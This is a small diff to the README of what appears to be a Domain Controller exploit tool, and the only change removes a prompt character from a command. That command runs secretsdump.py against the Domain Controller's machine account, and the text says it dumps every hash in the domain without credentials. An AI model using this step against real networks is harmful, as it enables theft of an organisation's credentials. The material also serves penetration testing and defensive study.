@@ -53,7 +53,7 @@ If the Domain Controller is vulnerable, after running the exploit it should not 
 
 ## Dump hashes of the Domain Controller. 
 
-``> secretsdump.py -just-dc <DC-NAME>\$@<ip-address>``
+``secretsdump.py -just-dc <DC-NAME>\$@<ip-address>``
 
 By executing this, we will be able to see all the hashes of the domain, without any credentials. 
 
